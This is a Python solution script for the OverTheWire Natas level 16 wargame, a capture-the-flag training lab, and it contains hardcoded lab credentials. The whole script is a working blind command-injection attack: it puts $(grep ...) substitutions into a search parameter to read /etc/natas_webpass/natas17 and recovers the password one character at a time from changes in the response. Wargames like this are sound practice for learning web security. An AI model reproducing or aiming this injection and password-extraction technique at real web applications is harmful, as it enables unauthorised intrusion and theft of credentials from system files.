import requests,time
chars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 
exist = ''
 
passwd = '8Ps3H0GWbn5rd'

proxy='127.0.0.1:10808'
proxies={

  'sock5':'sock5://'+proxy,
 }

target = "http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/"
trueStr = 'Africans'
#for x in chars:
#    #print(target+'?needle=$(grep '+x+' /etc/natas_webpass/natas17)Africans')
#    r = requests.get(target+'?needle=$(grep '+x+' /etc/natas_webpass/natas17)Africans',proxies=proxies)
#    #print(r.content)
#    if trueStr not in r.text:
#        exist += x
#        print('Using:'+exist)

exist="357890bcdghkmnqrswAGHNPQSW357890"
for i in range(32-len(passwd)):
    for c in exist:
        #print(target+'?needle=$(grep ^'+passwd+c+' /etc/natas_webpass/natas17)Africans')
        print(c)
        r=requests.get(target+'?needle=$(grep ^'+passwd+c+' /etc/natas_webpass/natas17)Africans',proxies=proxies)
        if trueStr not in r.text:
            passwd += c
            print('Password:'+passwd+ '*' * int(32 - len(passwd)))
            break
        time.sleep(0.5)
